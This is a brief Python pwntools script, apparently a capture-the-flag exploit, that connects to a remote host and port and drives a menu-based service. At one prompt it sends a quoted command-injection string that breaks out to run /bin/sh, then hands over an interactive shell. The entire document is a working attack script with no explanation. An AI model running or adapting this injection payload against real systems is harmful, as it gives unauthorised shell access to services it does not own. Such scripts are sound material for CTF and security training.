from pwn import *

context(os='linux', arch='amd64', log_level='debug')

# p = process('../file/5781dfd4ffed4d51a72a28a8571ef063')
p = remote('61.147.171.105', '51631')

input('continue?')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'c')

p.sendlineafter(b'> ', b'5')
p.sendlineafter(b'? ', b'N')

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'\';/bin/sh;\'')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'123456')

p.sendlineafter(b'> ', b'4')

p.interactive()
